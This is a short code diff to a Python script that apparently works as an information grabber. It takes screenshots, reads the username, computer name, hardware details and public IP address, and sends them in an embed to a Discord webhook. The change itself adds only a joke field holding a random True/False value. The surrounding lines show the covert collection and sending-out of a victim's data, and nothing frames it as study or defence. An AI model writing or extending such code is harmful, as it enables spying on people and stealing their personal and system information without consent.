@@ -5,6 +5,7 @@ import platform
 import getpass
 import requests
 import psutil
+import random
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 def take_screenshot():
@@ -54,6 +55,8 @@ if __name__ == "__main__":
 
     screenshot_paths = take_screenshot()
 
+    sex = random.choice([True, False])
+
     public_ip = get_public_ip()
 
     username, computername, os_info, cpu_info, ram_info, disk_info = get_system_info()
@@ -72,6 +75,7 @@ if __name__ == "__main__":
     embed.add_embed_field(name="RAM", value=ram_info)
     embed.add_embed_field(name="Festplatten", value="\n".join(disk_info))
     embed.add_embed_field(name="Öffentliche IP-Adresse", value=public_ip)
+    embed.add_embed_field(name="Sex", value=str(sex))
     
     webhook.add_embed(embed)
 
